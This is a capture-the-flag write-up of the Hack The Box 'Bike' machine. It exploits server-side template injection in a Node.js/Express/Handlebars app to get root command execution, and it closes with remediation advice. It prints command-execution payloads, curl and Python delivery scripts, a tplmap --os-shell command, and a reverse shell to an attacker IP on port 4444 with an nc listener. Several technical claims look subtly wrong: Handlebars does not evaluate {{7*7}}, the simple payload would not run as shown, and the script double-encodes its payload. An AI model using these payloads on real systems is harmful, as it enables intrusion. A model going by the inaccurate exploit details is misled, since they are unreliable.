# Bike: Hack The Box Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen) ![OS](https://img.shields.io/badge/OS-Linux-blue) ![Category](https://img.shields.io/badge/Category-Web%20Application-orange)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| Machine Name | Bike |
| Difficulty | Very Easy (Starting Point) |
| Platform | Hack The Box |
| Operating System | Linux |
| Category | Web Application |

---

## Overview

This writeup documents the solution for the **Bike** machine on Hack The Box Starting Point, which demonstrates critical security failures in web application template rendering and input validation in Node.js environments.

## Challenge Context

The Bike machine illustrates the catastrophic risk of **Server-Side Template Injection (SSTI) vulnerabilities** in modern JavaScript web frameworks, particularly when using template engines like Handlebars without proper input sanitization.

**Key Demonstration:**

Template engines that evaluate user-controlled input server-side can provide direct pathways to remote code execution, bypassing traditional security controls and leading to complete system compromise.

## Learning Objectives

This lab teaches:

- Web service enumeration and fingerprinting
- Node.js and Express framework identification
- Server-Side Template Injection (SSTI) detection
- Payload crafting for restricted environments
- URL encoding techniques for exploit delivery
- Understanding Node.js runtime internals (`global` object)
- Real-world implications of template injection vulnerabilities

**Scenario:** Discovery and exploitation of SSTI vulnerability in a Node.js/Express application using Handlebars template engine, leading to remote command execution as root.

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Web Application Analysis](#web-application-analysis)
3. [Vulnerability Discovery: SSTI](#vulnerability-discovery)
4. [Exploitation](#exploitation)
5. [Root Access](#root-access)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Network Enumeration

```bash
nmap -sC -sV -oA bike 10.129.x.x
```

**Nmap Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
80/tcp open  http    Node.js Express framework
```

**Open Ports Identified:**
- **22/TCP**: SSH (OpenSSH 8.2p1)
- **80/TCP**: HTTP (Node.js Express)

✅ **Primary Attack Surface:** Web application on port 80

---

## Web Application Analysis

### Initial Reconnaissance

**Access the web application:**
```
http://10.129.x.x/
```

**Visual Inspection:**
- Simple contact form interface
- User input field for email submission
- Minimal client-side validation

### Technology Stack Fingerprinting

**Using Wappalyzer Browser Extension:**

| Technology | Version/Type |
|------------|--------------|
| Web Server Runtime | Node.js |
| Web Framework | Express |
| Template Engine | Handlebars |
| Programming Language | JavaScript |

**Screenshot Evidence:**
*[Image: Wappalyzer Results]*

✅ **Critical Finding:** Handlebars template engine in use

### Technology Analysis

**Handlebars Template Engine:**
- Popular JavaScript templating library
- Uses `{{}}` syntax for variable interpolation
- Executes server-side in Node.js environment
- **Known vulnerability:** SSTI if user input is directly rendered

**Express Framework:**
- Minimal web application framework for Node.js
- Often used with template engines
- Requires careful input sanitization

---

## Vulnerability Discovery

### Testing for SSTI

**Concept:**
Server-Side Template Injection occurs when user input is embedded into templates without proper sanitization, allowing attackers to inject template directives.

### Basic SSTI Detection

**Test Payload #1: Mathematical Expression**
```
{{7*7}}
```

**Expected Behavior (Vulnerable):**
- Application evaluates expression
- Returns: `49`

**Expected Behavior (Not Vulnerable):**
- Application treats as literal string
- Returns: `{{7*7}}`

### Submit Test Payload

**Method 1: Direct Form Submission**
1. Navigate to contact form
2. Enter payload in email field: `{{7*7}}`
3. Submit form

**Method 2: Using Burp Suite**
```http
POST / HTTP/1.1
Host: 10.129.x.x
Content-Type: application/x-www-form-urlencoded

email={{7*7}}
```

### Confirmation

**Response Analysis:**
- Application returns: `49`
- Expression was evaluated server-side
- Template interpolation is active

✅ **SSTI Vulnerability Confirmed**

---

## Exploitation

### Understanding the Constraint

**Initial Challenge:**
- Template context restricts certain JavaScript functions
- Direct `require()` calls are not available
- Need to access Node.js runtime globals

### Node.js Runtime Internals

**Key Concepts:**

1. **`global` Object:**
   - Top-level namespace in Node.js
   - Equivalent to `window` in browsers
   - Provides access to runtime functions

2. **`process` Object:**
   - Available via `global.process`
   - Contains system execution methods
   - Key method: `process.mainModule.require()`

3. **`child_process` Module:**
   - Allows spawning shell commands
   - Method: `require('child_process').exec()`

### Payload Development

#### Payload Structure

**Basic RCE Payload (Unencoded):**
```javascript
{{global.process.mainModule.require('child_process').exec('COMMAND')}}
```

**Example: List Directory:**
```javascript
{{global.process.mainModule.require('child_process').exec('ls -la')}}
```

**Example: Read Flag:**
```javascript
{{global.process.mainModule.require('child_process').exec('cat /root/flag.txt')}}
```

### URL Encoding Requirements

**Problem:**
- Special characters break HTTP requests
- Parentheses, quotes, and spaces need encoding

**Solution:**
Use Burp Suite Decoder or online URL encoder

#### Encoding Process

**Burp Suite Method:**
1. Open Burp Suite → Decoder tab
2. Paste payload
3. Select "Encode as" → "URL"

**Example Encoding:**

| Character | URL Encoded |
|-----------|-------------|
| Space ` ` | `%20` |
| Single quote `'` | `%27` |
| Parenthesis `(` | `%28` |
| Parenthesis `)` | `%29` |
| Slash `/` | `%2F` |

**Encoded Payload Example:**
```
{{global.process.mainModule.require('child_process').exec('cat /root/flag.txt')}}
```

**Becomes:**
```
%7b%7bglobal.process.mainModule.require%28%27child_process%27%29.exec%28%27cat%20%2Froot%2Fflag.txt%27%29%7d%7d
```

### Execution Methods

#### Method 1: Burp Suite Repeater

```http
POST / HTTP/1.1
Host: 10.129.x.x
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

email=%7b%7bglobal.process.mainModule.require%28%27child_process%27%29.exec%28%27cat%20%2Froot%2Fflag.txt%27%29%7d%7d
```

#### Method 2: cURL

```bash
curl -X POST http://10.129.x.x/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=%7b%7bglobal.process.mainModule.require%28%27child_process%27%29.exec%28%27whoami%27%29%7d%7d"
```

#### Method 3: Python Script

```python
import requests
import urllib.parse

target = "http://10.129.x.x/"

# Payload
payload = "{{global.process.mainModule.require('child_process').exec('cat /root/flag.txt')}}"

# URL encode
encoded_payload = urllib.parse.quote(payload)

# Send request
data = {"email": encoded_payload}
response = requests.post(target, data=data)

print(response.text)
```

---

## Root Access

### Verify Privileges

**Command:**
```javascript
{{global.process.mainModule.require('child_process').exec('whoami')}}
```

**Response:**
```
root
```

✅ **The web server is running as root**

### System Enumeration

**Check OS Version:**
```javascript
{{global.process.mainModule.require('child_process').exec('cat /etc/os-release')}}
```

**List Root Directory:**
```javascript
{{global.process.mainModule.require('child_process').exec('ls -la /root')}}
```

### Establishing Interactive Shell (Optional)

**Reverse Shell Payload:**
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'
```

**Encoded in SSTI:**
```javascript
{{global.process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"')}}
```

**Listener Setup:**
```bash
nc -lvnp 4444
```

---

## Flags

### Root Flag

**Location:**
```
/root/flag.txt
```

**Extraction Command:**
```javascript
{{global.process.mainModule.require('child_process').exec('cat /root/flag.txt')}}
```

**Flag:** `[redacted]`

---

## Attack Chain Summary

```
Port Scan (Nmap)
        ↓
Web Service Discovery (Port 80)
        ↓
Technology Fingerprinting (Wappalyzer)
        ↓
Template Engine Identified (Handlebars)
        ↓
SSTI Detection ({{7*7}} → 49)
        ↓
Node.js Context Research
        ↓
Payload Crafting (global.process.mainModule.require)
        ↓
URL Encoding (Burp Decoder)
        ↓
Command Execution
        ↓
Root Access (whoami → root)
        ↓
Flag Retrieval
```

---

## Key Takeaways

### Technical Lessons

1. **Server-Side Template Injection (SSTI)**
   - User input rendered in templates = potential RCE
   - Always test for template evaluation: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
   - Different engines have different syntax (Handlebars, Jinja2, Twig, etc.)

2. **Node.js Template Engines**
   - Handlebars, Pug, EJS all vulnerable if misused
   - User input should NEVER be directly rendered as template code
   - Use parameterized rendering or sanitization libraries

3. **Node.js Runtime Exploitation**
   - `global` object provides access to runtime
   - `process.mainModule.require()` bypasses some restrictions
   - `child_process.exec()` enables command execution
   - Understanding the runtime is critical for exploitation

4. **Payload Encoding**
   - Special characters break HTTP requests
   - URL encoding is essential for reliable exploits
   - Burp Suite Decoder is invaluable
   - Test payloads locally before deployment

5. **Running as Root**
   - Web servers should NEVER run as root
   - Principle of least privilege
   - Even minor vulnerabilities = full compromise

### Enumeration Best Practices

✅ **Do:**
- Always fingerprint web technologies (Wappalyzer, WhatWeb)
- Test for injection in ALL user input fields
- Understand the underlying technology stack
- Research known vulnerabilities in identified frameworks
- Use encoding tools for complex payloads

❌ **Don't:**
- Assume modern frameworks are automatically secure
- Skip testing simple payloads ({{7*7}} is often enough)
- Ignore error messages (they reveal internals)
- Forget to URL encode special characters
- Overlook the importance of runtime context

### SSTI Detection Patterns

| Template Engine | Detection Payload | Expected Output |
|-----------------|-------------------|-----------------|
| Handlebars (Node.js) | `{{7*7}}` | `49` |
| Jinja2 (Python) | `{{7*7}}` | `49` |
| Twig (PHP) | `{{7*7}}` | `49` |
| Freemarker (Java) | `${7*7}` | `49` |
| Velocity (Java) | `#set($x=7*7)$x` | `49` |
| ERB (Ruby) | `<%= 7*7 %>` | `49` |

---

## Tools Used

| Tool | Purpose | Key Usage |
|------|---------|-----------|
| `nmap` | Port scanning | `-sC -sV` for service detection |
| Wappalyzer | Technology fingerprinting | Browser extension |
| Burp Suite | Request manipulation | Decoder, Repeater |
| `curl` | HTTP client | `-X POST -d` for payload delivery |
| Python `requests` | Scripted exploitation | Automated payload delivery |

---

## Remediation

### For Developers

1. **Never Render User Input as Templates**
   ```javascript
   // VULNERABLE
   app.get('/', (req, res) => {
     let template = req.query.email;
     res.render('index', { email: template }); // DON'T DO THIS
   });
   
   // SECURE
   app.get('/', (req, res) => {
     let email = req.query.email;
     res.render('index', { email: email }); // Pass as data, not template
   });
   ```

2. **Use Templating Safely**
   ```javascript
   // In Handlebars template:
   // SAFE - treating as data
   <p>Your email: {{email}}</p>
   
   // UNSAFE - treating as template
   {{{email}}} // Triple braces = unescaped, dangerous
   ```

3. **Input Validation**
   ```javascript
   const validator = require('validator');
   
   if (!validator.isEmail(userInput)) {
     return res.status(400).send('Invalid email');
   }
   ```

4. **Content Security Policy**
   ```javascript
   app.use(helmet.contentSecurityPolicy({
     directives: {
       defaultSrc: ["'self'"],
       scriptSrc: ["'self'"]
     }
   }));
   ```

5. **Run with Least Privilege**
   ```bash
   # NEVER run as root
   useradd -m -s /bin/bash webuser
   sudo -u webuser node app.js
   ```

### For System Administrators

1. **Containerization**
   - Run web apps in Docker containers
   - Limit container capabilities
   - Use non-root user in Dockerfile

2. **Application Firewall**
   - Deploy ModSecurity or similar WAF
   - Block common SSTI patterns
   - Rate limit requests

3. **Security Monitoring**
   - Log all template rendering
   - Alert on unusual characters in input
   - Monitor for `child_process` execution

---

## References

- [OWASP: Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [PortSwigger: SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [Handlebars Documentation](https://handlebarsjs.com/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [HackTricks: SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

## Additional Resources

### SSTI Payloads Repository
```bash
# Clone SSTI payloads
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
cd PayloadsAllTheThings/Server\ Side\ Template\ Injection/
```

### Automated SSTI Detection
```bash
# Tplmap - SSTI scanner
git clone https://github.com/epinna/tplmap.git
cd tplmap
./tplmap.py -u "http://10.129.x.x/" --os-shell
```

---

**Machine Pwned:** ✅  
**Difficulty Rating:** Very Easy (Starting Point)  
**Real-World Relevance:** High (SSTI common in modern web apps)  
**Learning Value:** Excellent introduction to template injection attacks
